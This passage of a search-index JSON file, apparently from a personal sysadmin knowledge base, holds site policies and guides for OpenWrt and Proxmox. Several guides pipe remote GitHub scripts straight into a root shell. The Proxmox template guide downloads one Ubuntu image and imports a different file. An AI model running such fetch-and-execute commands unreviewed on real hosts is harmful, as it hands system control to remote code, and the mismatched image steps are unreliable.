cookies.</p>", "tags": ["information", "Cookies"]}, {"location": "information/cookies-policy/#social-media-cookies", "title": "Social Media Cookies", "text": "<p>Cookies are used by social media services to enable you to share our content with your friends and networks. These cookies may track your browser across other sites and build a profile of your interests, which may impact the content and messages you see on other websites that you visit.</p>", "tags": ["information", "Cookies"]}, {"location": "information/cookies-policy/#google-analytics", "title": "Google Analytics", "text": "<p>We use Google Analytics for aggregated, anonymized website traffic analysis. In order to track your session usage, Google drops a cookie (_ga) with a randomly-generated ClientID in your browser. This ID is anonymized and contains no identifiable information like email, phone number, name, etc. We also send Google your IP Address. We use GA to track aggregated website behavior, such as what pages you looked at, for how long, and so on. This information is important to us for improving the user experience and determining site effectiveness. If you would like to access what browsing information we have \u2013 or ask us to delete any GA data \u2013 please delete your _ga cookies, reach out to us via this form, and/or install the Google Analytics Opt-Out Browser Add-On.</p>", "tags": ["information", "Cookies"]}, {"location": "information/cookies-policy/#how-to-manage-remove-cookies", "title": "How to manage &amp; remove cookies", "text": "<p>If you are using our Services via a browser you can restrict, block or remove cookies through your web browser settings. The Help menu on the menu bar of most browsers also tells you how to prevent your browser from accepting new cookies, how to delete old cookies, how to have the browser notify you when you receive a new cookie and how to disable cookies altogether. You can also visit https://www.aboutcookies.org for more information on how to manage and remove cookies across a number of different internet browsers. You also have the option to change your choices relating to cookies utilized to deliver behaviorally targeted advertising here for EU \u201cAdvertising cookies\u201d and here for US Advertising cookies. If you would like to contact us about cookies please our online feedback form or our contact page.</p>", "tags": ["information", "Cookies"]}, {"location": "information/endorsement/", "title": "Website Endorsements", "text": "<p>Website endorsement for our partners and friends who support our mission.</p>", "tags": ["information", "endorsements"]}, {"location": "information/endorsement/#adventureapp", "title": "adventure.app", "text": "<p>Adventure is an app that provides you with a simple and intuitive interface to plan your trip. You can choose from a wide range of activities and destinations. We also provide you with a recommendation system that will help you choose the best activity for you. Visit adventure.app!</p>", "tags": ["information", "endorsements"]}, {"location": "information/license/", "title": "License", "text": "", "tags": ["information", "license"]}, {"location": "information/license/#mit-license", "title": "MIT License", "text": "<p>Copyright\u00a9 3os.org 2022</p> <p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p> <p>The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p> <p>THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p>", "tags": ["information", "license"]}, {"location": "information/portfolio/", "title": "Stas Yakobov's Portfolio", "text": "Stas Yakobov aka fire1ce  <p> \u2022 I'm security researcher - specialized in hardware pentetrations tests</p> <p> \u2022 I like experimenting with technologies, building small projects, automate everything.</p> <p> \u2022 Passionate about security, linux, dockers, electronics(IoT), coding, open-source and knowledge</p> <p> \u2022 I'm the owner and the maintener of a 3os.org knowledge-base website</p>  How To Reach Me  <p> </p> <p> </p>", "tags": ["portfolio", "resume"]}, {"location": "information/privacy-policy/", "title": "Privacy Policy", "text": "<p>Your privacy is very important to us. Accordingly, we have developed this policy in order for you to understand how we collect, use, communicate and make use of personal information. The following outlines our privacy policy.</p> <p>When accessing this website, will learn certain information about you during your visit.</p> <p>Similar to other commercial websites, our website utilizes a standard technology called \u2018cookies\u2019 (see explanation below) and server logs to collect information about how our site is used. Information gathered through cookies and server logs may include the date and time of visits, the pages viewed, time spent at our site, and the websites visited just before and just after our own, as well as your IP address.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#use-of-cookie", "title": "Use of Cookie", "text": "<p>A cookie is a very small text document, which often includes an anonymous unique identifier. When you visit a website, that site\u2019s computer asks your computer for permission to store this file in a part of your hard drive specifically designated for cookies. Each website can send its own cookie to your browser if your browser\u2019s preferences allow it, but (to protect your privacy) your browser only permits a website to access the cookies it has already sent to you, not the cookies sent to you by other sites.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#ip-addresses", "title": "IP Addresses", "text": "<p>IP addresses are used by your computer every time you are connected to the Internet. Your IP address is a number that is used by computers on the network to identify your computer. IP addresses are automatically collected by our web server as part of demographic and profile data known as \u201ctraffic data\u201d so that data (such as the Web pages you request) can be sent to you.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#email-information", "title": "Email Information", "text": "<p>If you choose to correspond with us through email, we may retain the content of your email messages together with your email address and our responses. We provide the same protections for these electronic communications that we employ in the maintenance of information received online, mail and telephone. This also applies when you register for our website, sign up through any of our forms using your email address or make a purchase on this site. For further information see the email policies below.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#how-do-we-use-the-information-that-you-provide-to-us", "title": "How Do We Use The Information That You Provide To Us?", "text": "<p>Broadly speaking, we use personal information for purposes of administering our business activities, providing customer service and making available other items and services to our customers and prospective customers.</p> <p>will not obtain personally-identifying information about you when you visit our site, unless you choose to provide such information to us, nor will such information be sold or otherwise transferred to unaffiliated third parties without the approval of the user at the time of collection.</p> <p>We may disclose information when legally compelled to do so, in other words, when we, in good faith, believe that the law requires it or for the protection of our legal rights.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#email-policies", "title": "Email Policies", "text": "<p>We are committed to keeping your e-mail address confidential. We do not sell, rent, or lease our subscription lists to third parties, and we will not provide your personal information to any third party individual, government agency, or company at any time unless strictly compelled to do so by law.</p> <p>We will use your e-mail address solely to provide timely information about .</p> <p>We will maintain the information you send via e-mail in accordance with applicable federal law.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#can-spam-compliance", "title": "CAN-SPAM Compliance", "text": "<p>In compliance with the CAN-SPAM Act, all e-mail sent from our organization will clearly state who the e-mail is from and provide clear information on how to contact the sender. In addition, all e-mail messages will also contain concise information on how to remove yourself from our mailing list so that you receive no further e-mail communication from us.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#choiceopt-out", "title": "Choice/Opt-Out", "text": "<p>Our site provides users the opportunity to opt-out of receiving communications from us and our partners by reading the unsubscribe instructions located at the bottom of any e-mail they receive from us at anytime.</p> <p>Users who no longer wish to receive our newsletter or promotional materials may opt-out of receiving these communications by clicking on the unsubscribe link in the e-mail.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#use-of-external-links", "title": "Use of External Links", "text": "<p>This website may contain links to many other websites. cannot guarantee the accuracy of information found at any linked site. Links to or from external sites not owned or controlled by do not constitute an endorsement by or any of its employees of the sponsors of these sites or the products or information presented therein.</p> <p>By accessing this web site, you are agreeing to be bound by these web site Terms and Conditions of Use, all applicable laws and regulations, and agree that you are responsible for compliance with any applicable local laws. If you do not agree with any of these terms, you are prohibited from using or accessing this site. The materials contained in this web site are protected by applicable copyright and trade mark law.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#acceptable-use", "title": "Acceptable Use", "text": "<p>You agree to use our website only for lawful purposes, and in a way that does not infringe the rights of, restrict or inhibit anyone else\u2019s use and enjoyment of the website. Prohibited behavior includes harassing or causing distress or inconvenience to any other user, transmitting obscene or offensive content or disrupting the normal flow of dialogue within our website.</p> <p>You must not use our website to send unsolicited commercial communications. You must not use the content on our website for any marketing related purpose without our express written consent.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#restricted-access", "title": "Restricted Access", "text": "<p>We may in the future need to restrict access to parts (or all) of our website and reserve full rights to do so. If, at any point, we provide you with a username and password for you to access restricted areas of our website, you must ensure that both your username and password are kept confidential.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#use-of-testimonials", "title": "Use of Testimonials", "text": "<p>In accordance to with the FTC guidelines concerning the use of endorsements and testimonials in advertising, please be aware of the following:</p> <p>Testimonials that appear on this site are actually received via text, audio or video submission. They are individual experiences, reflecting real life experiences of those who have used our products and/or services in some way. They are individual results and results do vary. We do not claim that they are typical results. The testimonials are not necessarily representative of all of those who will use our products and/or services.</p> <p>The testimonials displayed in any form on this site (text, audio, video or other) are reproduced verbatim, except for correction of grammatical or typing errors. Some may have been shortened. In other words, not the whole message received by the testimonial writer is displayed when it seems too lengthy or not the whole statement seems relevant for the general public.</p> <p>We are not responsible for any of the opinions or comments posted on this website. This website is not a forum for testimonials, however provides testimonials as a means for customers to share their experiences with one another. To protect against abuse, all testimonials appear after they have been reviewed by the management . We not share the opinions, views or commentary of any testimonials on this website \u2013 the opinions are strictly the views of the testimonial source.</p> <p>The testimonials are never intended to make claims that our products and/or services can be used to diagnose, treat, cure, mitigate or prevent any disease. Any such claims, implicit or explicit, in any shape or form, have not been clinically tested or evaluated.</p> <p>How Do We Protect Your Information And Secure Information Transmissions?</p> <p>Email is not recognized as a secure medium of communication. For this reason, we request that you do not send private information to us by email. However, doing so is allowed, but at your own risk. Some of the information you may enter on our website may be transmitted securely via a secure medium known as Secure Sockets Layer, or SSL. Credit Card information and other sensitive information is never transmitted via email.</p> <p>We may use software programs to create summary statistics, which are used for such purposes as assessing the number of visitors to the different sections of our site, what information is of most and least interest, determining technical design specifications, and identifying system performance or problem areas.</p> <p>For site security purposes and to ensure that this service remains available to all users, uses software programs to monitor network traffic to identify unauthorized attempts to upload or change information, or otherwise cause damage.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#disclaimer-and-limitation-of-liability", "title": "Disclaimer And Limitation Of Liability", "text": "<p>We makes no representations, warranties, or assurances as to the accuracy, currency or completeness of the content contain on this website or any sites linked to this site.</p> <p>All the materials on this site are provided \u2018as is\u2019 without any express or implied warranty of any kind, including warranties of merchantability, noninfringement of intellectual property or fitness for any particular purpose. In no event shall or its agents or associates be liable for any damages whatsoever (including, without limitation, damages for loss of profits, business interruption, loss of information, injury or death) arising out of the use of or inability to use the materials, even if has been advised of the possibility of such loss or damages.</p>", "tags": ["information", "privacy policy"]}, {"location": "information/privacy-policy/#policy-changes", "title": "Policy Changes", "text": "<p>We reserve the right to amend this privacy policy at any time with or without notice. However, please be assured that if the privacy policy changes in the future, we will not use the personal information you have submitted to us under this privacy policy in a manner that is materially inconsistent with this privacy policy, without your prior consent.</p> <p>We are committed to conducting our business in accordance with these principles in order to ensure that the confidentiality of personal information is protected and maintained.</p>", "tags": ["information", "privacy policy"]}, {"location": "infrastructure/openwrt/disable-ipv6/", "title": "OpenWrt Disable IPV6", "text": "<p>The following steps will disable IPV6 on your OpenWrt router . All the steps are performed via the command line. You can performe them in the console of the router but the preferred way is via SSH.</p> <p>Follow the following steps to disable IPV6 on your OpenWrt router:</p> <pre><code>uci set 'network.lan.ipv6=0'\nuci set 'network.wan.ipv6=0'\nuci set 'dhcp.lan.dhcpv6=disabled'\n/etc/init.d/odhcpd disable\nuci commit\n</code></pre> <p>Disable RA and DHCPv6 so no IPv6 IPs are handed out:</p> <pre><code>uci -q delete dhcp.lan.dhcpv6\nuci -q delete dhcp.lan.ra\nuci commit dhcp\n/etc/init.d/odhcpd restart\n</code></pre> <p>You can now disable the LAN delegation:</p> <pre><code>uci set network.lan.delegate=\"0\"\nuci commit network\n/etc/init.d/network restart\n</code></pre> <p>You might as well disable odhcpd:</p> <pre><code>/etc/init.d/odhcpd disable\n/etc/init.d/odhcpd stop\n</code></pre> <p>And finally you can delete the IPv6 ULA Prefix:</p> <pre><code>uci -q delete network.globals.ula_prefix\nuci commit network\n/etc/init.d/network restart\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "infrastructure/openwrt/install-oh-my-zsh/", "title": "Install oh-my-zsh on OpenWrt", "text": "<p>You can install oh-my-zsh on OpenWrt, make sure to use the <code>Prevent User Lockout</code> option since many users been locked out of their sessions since the <code>zsh</code> shell was not installed or loaded properly.</p>", "tags": ["template", "markdown"]}, {"location": "infrastructure/openwrt/install-oh-my-zsh/#whats-zsh", "title": "Whats' ZSH", "text": "<p>Z-shell (Zsh) configuration. is a Unix shell that can be used as an interactive login shell and as a shell scripting command interpreter. Zsh is an enhanced Bourne shell with many enhancements, including some Bash, ksh and tcsh features.</p>", "tags": ["template", "markdown"]}, {"location": "infrastructure/openwrt/install-oh-my-zsh/#whats-oh-my-zsh", "title": "What's Oh-My-Zsh", "text": "<p>Oh My Zsh is an open source, community-driven framework for managing your zsh configuration.</p>", "tags": ["template", "markdown"]}, {"location": "infrastructure/openwrt/install-oh-my-zsh/#installation-of-oh-my-zsh", "title": "Installation of oh-my-zsh", "text": "<p>Install Requirements Packages</p> <pre><code>opkg update &amp;&amp; opkg install ca-certificates zsh curl git-http\n</code></pre> <p>Install oh-my-zsh</p> <pre><code>sh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n</code></pre> <p>Set zsh as default (thanks to @mlouielu)</p> <pre><code>which zsh &amp;&amp; sed -i -- 's:/bin/ash:'`which zsh`':g' /etc/passwd\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "infrastructure/openwrt/install-oh-my-zsh/#prevent-user-lockout", "title": "Prevent User Lockout", "text": "<p>To prevent lock-outs after accidentially removing zsh (thanks to @fox34) (as explained in the wiki you can add a check for <code>zsh</code> and fallback to <code>ash</code> in <code>/etc/rc.local</code>:</p> <pre><code># Revert root shell to ash if zsh is not available\nif grep -q '^root:.*:/usr/bin/zsh$' /etc/passwd &amp;&amp; [ ! -x /usr/bin/zsh ]; then\n    # zsh is root shell, but zsh was not found or not executable: revert to default ash\n    [ -x /usr/bin/logger ] &amp;&amp; /usr/bin/logger -s \"Reverting root shell to ash, as zsh was not found on the system\"\n    sed -i -- 's:/usr/bin/zsh:/bin/ash:g' /etc/passwd\nfi\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "infrastructure/openwrt/snippets/", "title": "Snippets and Tips", "text": "<p>OpenWrt Snippets with useful commands and scripts. Best practices and tips.</p>", "tags": ["template", "markdown"]}, {"location": "infrastructure/openwrt/snippets/#update-all-packages-on-openwrt-from-ssh", "title": "Update all packages on OpenWrt from SSH", "text": "<pre><code>opkg update &amp;&amp; opkg list-upgradable | cut -f 1 -d ' ' | xargs opkg upgrade\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "infrastructure/openwrt/snippets/#enable-luci-https-redirect-from-http", "title": "Enable LuCI HTTPS redirect from HTTP", "text": "<p>This will activate the HTTPS redirect from HTTP in LuCI.</p> <pre><code>uci set uhttpd.main.redirect_https=1\nuci commit uhttpd\nservice uhttpd reload\n</code></pre>", "tags": ["template", "markdown"]}, {"location": "infrastructure/proxmox/cloud-image-template/", "title": "Proxmox Cloud Image Template", "text": "", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/cloud-image-template/#about-cloud-images", "title": "About Cloud Images", "text": "<p>Cloud images are operating system templates and every instance starts out as an identical clone of every other instance. It is the user data that gives every cloud instance its personality and cloud-init is the tool that applies user data to your instances automatically.</p>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/cloud-image-template/#advantage-of-cloud-image-template", "title": "Advantage of Cloud Image Template", "text": "<ul> <li>Predefined SSH keys</li> <li>Predefined user account</li> <li>Predefined network configuration</li> <li>VM creation time is under few minutes</li> <li>No installation process required like with ISO images</li> <li>First boot always updated with latest updates</li> </ul>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/cloud-image-template/#ubuntu-cloud-images", "title": "Ubuntu Cloud Images", "text": "<p>Ubuntu provides official cloud images you can find the proper image for your needs at cloud-images.ubuntu.com.</p> <p>In this tutorial we will be using <code>Ubuntu Server 24.04 LTS Noble Numbat</code> cloud image.</p>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/cloud-image-template/#create-cloud-image-template", "title": "Create Cloud Image Template", "text": "<p>SSH to you Proxmox server.</p> <p>Download the cloud image template from the official website.</p> <pre><code>wget https://cloud-images.ubuntu.com/noble/current/noble-server-cloudimg-amd64.img\n</code></pre> <p>In order to create a cloud image template first of all we need to create a new <code>VM</code>. After we will configure it we will create a <code>Template</code> from it.</p> <p>The following parameters will predefine our <code>Base Template</code></p> <p>Command parameters description:</p> <ul> <li>9000: VM ID in Proxmox. I prefer to use high number for management purposes.</li> <li>memory: VM's memory in MB.</li> <li>core: Number of CPU cores for the VM.</li> <li>name: Name of the VM and the template.</li> <li>net0: Network interface for the VM.</li> <li>bridge: Network bridge for the VM.</li> <li>agent: Enable or disable QEMU agent support.</li> <li>onboot: Enable or disable VM start on boot.</li> </ul> <p>Create a new virtual machine.</p> <pre><code>qm create 9000 --memory 2048 --core 2 --name ubuntu-24.04-cloud --net0 virtio,bridge=vmbr0 --agent enabled=1 --onboot 1\n</code></pre> <p>The default storage Proxmox creates for vm is storage1. In my case I use different storage for vm's and templates named storage1. The following commands will utilize the storage1 storage. Change the storage name for your Proxmox server.</p> <p>Import the downloaded <code>Ubuntu Cloud Image</code> we downloaded before disk to the storage.</p> <pre><code>qm importdisk 9000 jammy-server-cloudimg-amd64.img storage1\n</code></pre> <p>Attach the new disk to the vm as a <code>scsi</code> drive on the <code>scsi</code> controller</p> <pre><code>qm set 9000 --scsihw virtio-scsi-pci --scsi0 storage1:vm-9000-disk-0\n</code></pre> <p>Add cloud init drive</p> <pre><code>qm set 9000 --ide2 storage1:cloudinit\n</code></pre> <p>Make the cloud init drive bootable and restrict BIOS to boot from disk only</p> <pre><code>qm set 9000 --boot c --bootdisk scsi0\n</code></pre> <p>Add serial console</p> <pre><code>qm set 9000 --serial0 socket --vga serial0\n</code></pre> <p>WARNING: DO NOT START THE VM</p> <p>Powering on the vm will create a unique ID that will presist with the template. We want to avoid this.</p> <p>Now had to the Proxmox web interface. Select the new vm and <code>Cloud-Init</code> tab.</p> <p></p> <p>Configure the default setting for the cloud image template. This will allow the VM to start with predefined user, password, ssh keys and network configuration.</p> <p></p> <p>At this point we configured the VM and we can create a cloud image template from it.</p> <p>Create a new cloud image template.</p> <pre><code>qm template 9000\n</code></pre> <p>Now you can use the Cloud Image Template to create new vm instances. You can do it from the Proxmox web interface or from the command line.</p> <p>Tip</p> <p>Use Full Clone when creating a new VM from a cloud image template. Linked Clone will privent you from deleting the cloud image template.</p> <p></p> <p>Cli example:</p> <pre><code>qm clone 9000 122 --name my-new-vm --full\n</code></pre>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/cloud-image-template/#vms-storage", "title": "VM's Storage", "text": "<p>Since we are using a minimal cloud image template. Cloned VM's will use the same storage as the template which is about 2GB of disk space.</p> <p>You can utilize an automated script to to expand the disk space of the cloned VM: VM Disk Expander</p>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/cloud-image-template/#troubleshooting", "title": "Troubleshooting", "text": "", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/cloud-image-template/#reseting-vms-machine-id", "title": "Reseting VM's <code>machine-id</code>", "text": "<p>Run the following command inside the VM to reset the machine-id.</p> <pre><code>sudo rm -f /etc/machine-id\nsudo rm -f /var/lib/dbus/machine-id\n</code></pre> <p>Shutdown the VM. Then power it back on. The machine-id will be regenerated.</p> <p>If the machine-id is not regenerated you can try to fix it by running the following command.</p> <pre><code>sudo systemd-machine-id-setup\n</code></pre>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/lets-encrypt-cloudflare/", "title": "Proxmox Valid SSL With Let's Encrypt and Cloudflare DNS", "text": "<p>This is a guide to how to setup a valid SSL certificate with Let's Encrypt and <code>Cloudflare DNS</code> for <code>Proxmox VE</code>. Let's Encrypt will allow you to obtain a valid SSL certificate for your Proxmox VE Server for free for 90 days. In the following steps, we will setup a valid SSL certificate for your Proxmox VE Server using Let's Encrypt and Cloudflare DNS Challenge. The process of renewing the certificate is done automatically by Proxmox VE Server and you do not need to do anything manually to renew the certificate.</p>", "tags": ["proxmox", "cloudflare", "letsencrypt"]}, {"location": "infrastructure/proxmox/lets-encrypt-cloudflare/#prerequarements", "title": "Prerequarements", "text": "<ul> <li>Exisiting DNS record for the domain name you want to use for Proxmox VE.</li> <li>Cloudflare DNS Zone API Access Token.</li> <li>Cloudflare DNS Zone ID.</li> </ul> <p>I won't be covcovering the process of creating the Zone API Tokens at this guide. You can find more information about this process here.</p>", "tags": ["proxmox", "cloudflare", "letsencrypt"]}, {"location": "infrastructure/proxmox/lets-encrypt-cloudflare/#instalaion-and-configuration", "title": "Instalaion and Configuration", "text": "<p>The process will be done fully in Proxmox web interface. Login to the Proxmox web interface select <code>Datacenter</code>, find <code>ACME</code> and click on it.</p> <p></p> <p>At <code>Account</code> section, click Add. Fill the <code>Account Name</code> and <code>E-Mail</code>. Accept the Terms and Conditions (TOC). Click <code>Register</code>. This will register an account for Let's Encrypt service in order to obtain a certificate.</p> <p></p> <p>The output should be something like this:</p> <p></p> <p>At <code>Challenge Plugin</code> ection, click Add. Fill the <code>Plugin ID</code> (name), at <code>DNS API</code> choose <code>Cloudflare Managed DNS</code>. <code>CF_Token=</code> and <code>CF_Zone_ID=</code> are the API Tokens and Zone ID for Cloudflare DNS - leave the rest empty.</p> <p></p> <p>The final screen should look like this:</p> <p></p> <p>Select the <code>Pve Server</code> in my case its name <code>proxmox</code>, under <code>System</code> select <code>Certificates</code>.</p> <p></p> <p>At <code>ACME</code> section, click <code>Edit</code> and select the <code>Account</code> we created earlier.</p> <p></p> <p>Click <code>Add</code>, select <code>Challenge Type</code> <code>DNS</code> and <code>Challenge Plugin</code> the plugin we created earlier. <code>Domain</code> is the domain name we want to use for the certificate. Click <code>Create</code>.</p> <p></p> <p>Now its time to issue the certificate. Click <code>Order Certificate Now</code>.</p> <p></p> <p>At this point Proxmox will try to issue the certificate from Let's Encrypt and validate it with Cloudflare DNS Challenge.</p> <p>If all goes well, you will see the following:</p> <p></p> <p>Now the certificate is installed and ready to use. The renewal process is done automatically by Proxmox VE Server.</p>", "tags": ["proxmox", "cloudflare", "letsencrypt"]}, {"location": "infrastructure/proxmox/pvekclean/", "title": "PVE Kernel Cleaner", "text": "<p>Easily remove old/unused PVE kernels on your Proxmox VE system</p>", "tags": ["proxmox"]}, {"location": "infrastructure/proxmox/pvekclean/#developers", "title": "Developers", "text": "<ul> <li>Jordan Hillis - Lead Developer</li> </ul> <p>The original pvekclean github page</p>", "tags": ["proxmox"]}, {"location": "infrastructure/proxmox/pvekclean/#what-is-pve-kernel-cleaner", "title": "What is PVE Kernel Cleaner?", "text": "<p>PVE Kernel Cleaner is a program to compliment Proxmox Virtual Environment which is an open-source server virtualization environment. PVE Kernel Cleaner allows you to purge old/unused kernels filling the /boot directory. As new kernels are released the older ones have to be manually removed frequently to make room for newer ones. This can become quite tedious and require extensive time spent monitoring the system when new kernels are released and when older ones need to be cleared out to make room. With this issue existing, PVE Kernel Cleaner was created to solve it.</p>", "tags": ["proxmox"]}, {"location": "infrastructure/proxmox/pvekclean/#features", "title": "Features", "text": "<ul> <li>Removes old PVE kernels from your system</li> <li>Ability to schedule PVE kernels to automatically be removed on a daily/weekly/monthly basis</li> <li>Run a simple pvekclean command for ease of access</li> <li>Checks health of boot disk based on space available</li> <li>Debug mode for non-destructive testing</li> <li>Update function to easily update the program to the latest version</li> <li>Allows you to specify the minimum number of most recent PVE kernels to retain</li> <li>Support for the latest Proxmox versions and PVE kernels</li> </ul>", "tags": ["proxmox"]}, {"location": "infrastructure/proxmox/pvekclean/#prerequisites", "title": "Prerequisites", "text": "<p>Before using this program you will need to have the following packages installed. * cron * curl * git</p> <p>To install all required packages enter the following command.</p>", "tags": ["proxmox"]}, {"location": "infrastructure/proxmox/pvekclean/#debian", "title": "Debian:", "text": "<pre><code>sudo apt-get install cron curl git\n</code></pre>", "tags": ["proxmox"]}, {"location": "infrastructure/proxmox/pvekclean/#installing", "title": "Installing", "text": "<p>You can install PVE Kernel Cleaner using either Git or Curl. Choose the method that suits you best:</p>", "tags": ["proxmox"]}, {"location": "infrastructure/proxmox/pvekclean/#installation-via-git", "title": "Installation via Git", "text": "<ol> <li> <p>Open your terminal.</p> </li> <li> <p>Enter the following commands one by one to install PVE Kernel Cleaner:</p> </li> </ol> <pre><code>git clone https://github.com/jordanhillis/pvekclean.git\ncd pvekclean\nchmod +x pvekclean.sh\n./pvekclean.sh\n</code></pre>", "tags": ["proxmox"]}, {"location": "infrastructure/proxmox/pvekclean/#installation-via-curl", "title": "Installation via Curl", "text": "<ol> <li> <p>Open your terminal.</p> </li> <li> <p>Use the following command to install PVE Kernel Cleaner:</p> </li> </ol> <pre><code>curl -o pvekclean.sh https://raw.githubusercontent.com/jordanhillis/pvekclean/master/pvekclean.sh\nchmod +x pvekclean.sh\n./pvekclean.sh\n</code></pre>", "tags": ["proxmox"]}, {"location": "infrastructure/proxmox/pvekclean/#updating", "title": "Updating", "text": "<p>PVE Kernel Cleaner checks for updates automatically when you run it. If an update is available, you'll be notified within the program. Simply follow the on-screen instructions to install the update, and you're all set with the latest version!</p>", "tags": ["proxmox"]}, {"location": "infrastructure/proxmox/pvekclean/#usage", "title": "Usage", "text": "<p>Example of usage: <pre><code> pvekclean [OPTION1] [OPTION2]...\n\n-k, --keep [number]   Keep the specified number of most recent PVE kernels on the system\n                      Can be used with -f or --force for non-interactive removal\n-f, --force           Force the removal of old PVE kernels without confirm prompts\n-rn, --remove-newer   Remove kernels that are newer than the currently running kernel\n-s, --scheduler       Have old PVE kernels removed on a scheduled basis\n-v, --version         Shows current version of pvekclean\n-r, --remove          Uninstall pvekclean from the system\n-i, --install         Install pvekclean to the system\n-d, --dry-run         Run the program in dry run mode for testing without making system changes\n</code></pre></p>", "tags": ["proxmox"]}, {"location": "infrastructure/proxmox/vm-disk-expander/", "title": "Proxmox Virtual Machine Disk Expander", "text": "<p>Github Repository: Proxmox vm disk expander</p> <p>Interactive disk expander for Proxmox's VM disks (including the partition) from your Proxmox host cli.</p>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/vm-disk-expander/#curl-method", "title": "Curl Method", "text": "<p>Run the script once, without installing it.</p> <pre><code>bash &lt;(curl -s https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/expand.sh)\n</code></pre>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/vm-disk-expander/#installer", "title": "Installer", "text": "<p>Install the script at Proxmox host for multiple use.</p> <p>Run the following command from Proxmox host:</p> <pre><code>curl -sS https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/install.sh | bash\n</code></pre>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/vm-disk-expander/#usage", "title": "Usage", "text": "<pre><code>expand-disk\n</code></pre>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/vm-disk-expander/#update", "title": "Update", "text": "<p>Same as the installer.</p> <pre><code>curl -sS https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/install.sh | bash\n</code></pre>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/vm-disk-expander/#example-usageoutput", "title": "Example usage/output", "text": "<pre><code>\u256d\u2500root@proxmox ~\n\u2570\u2500# bash &lt;(curl -s https://raw.githubusercontent.com/bermanboris/proxmox-vm-disk-expander/main/expand.sh)                                                      1 \u21b5\n      VMID NAME                 STATUS     MEM(MB)    BOOTDISK(GB) PID\n       100 vm100                running    4096              40.20 1113\n       101 test                 stopped    2048               2.20 0\n      9000 ubuntu22-04-cloud    stopped    2048               2.20 0\nEnter the VM ID to be expanded: 101\nEnter the size to be expanded in GB (example: 10G): 5G\nVM ID 101 disk storage1 will be expanded by 5G\nWarning: There is currently no way to downsize the disk!\nAre you sure you want to expand the disk? (yes/no): yes\n\nExpanding the disk...  Size of logical volume storage1/vm-101-disk-0 changed from &lt;2.20 GiB (563 extents) to &lt;7.20 GiB (1843 extents).\n  Logical volume storage1/vm-101-disk-0 successfully resized.\nGPT:Primary header thinks Alt. header is not at the end of the disk.\nGPT:Alternate GPT header not at the end of the disk.\nGPT: Use GNU Parted to correct GPT errors.\nadd map storage1-vm--101--disk--0p1 (253:12): 0 4384735 linear 253:11 227328\nadd map storage1-vm--101--disk--0p14 (253:13): 0 8192 linear 253:11 2048\nadd map storage1-vm--101--disk--0p15 (253:14): 0 217088 linear 253:11 10240\nWarning: The kernel is still using the old partition table.\nThe new table will be used at the next reboot or after you\nrun partprobe(8) or kpartx(8)\nThe operation has completed successfully.\n</code></pre>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/vm-disk-expander/#limitations", "title": "Limitations", "text": "<ul> <li>VM must be stopped to expand the disk.</li> <li>Currently supported only \"cloud images\" (or single ext4 partition installation)   but if you still want to resize regular vm with LVM partition table, you need to extend the LVM partition INSIDE the vm AFTER running the script. Resizing LVM is done like this:</li> </ul> <pre><code>$ lvm\n\nlvm&gt; lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv\nlvm&gt; exit\n\n$ resize2fs /dev/ubuntu-vg/ubuntu-lv\n</code></pre> <ul> <li>Resize of Ceph disks is currently not supported (PR are welcome!)</li> </ul>", "tags": ["proxmox", "virtualization"]}, {"location": "infrastructure/proxmox/windows-vm-configuration/", "title": "Proxmox Windows Virtual Machine Configuration", "text": "<p>This guide will walk you through configuring Windows 10 or Windows 11 